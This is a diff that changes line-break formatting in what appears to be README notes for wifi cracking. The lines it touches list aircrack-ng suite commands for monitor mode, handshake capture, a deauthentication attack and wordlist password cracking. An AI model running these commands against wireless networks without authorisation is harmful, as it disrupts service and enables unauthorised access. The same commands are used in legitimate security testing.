@@ -131,15 +131,15 @@ you will need a wifi card that can do packet injection and monitor mode... \
 to test this use the following commands\
 
 check card supports monitor mode\
-**##### ifconfig wlan0 down
-**##### iwconfig wlan0 mode monitor
-**##### ifconfig wlan0 up
-**##### iwconfig ----- check if card is in monitor mode under man
+**##### ifconfig wlan0 down\
+**##### iwconfig wlan0 mode monitor\
+**##### ifconfig wlan0 up\
+**##### iwconfig ----- check if card is in monitor mode under man\
 
 check card supports packet injection\
-**##### terminal 1: airodump-ng wlan0
-**##### terminal 1: airodump-ng -c 2 -w packetcapture -d 00:00:00:00:00:00 wlan0
-**##### terminal 2: aireplay-ng --deauth -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan0
+**##### terminal 1: airodump-ng wlan0\
+**##### terminal 1: airodump-ng -c 2 -w packetcapture -d 00:00:00:00:00:00 wlan0\
+**##### terminal 2: aireplay-ng --deauth -a 00:00:00:00:00:00 -c 00:00:00:00:00:00 wlan0\
 **##### terminal 3: aircrack-ng packcapture.pcap -w passwords.txt
 
 
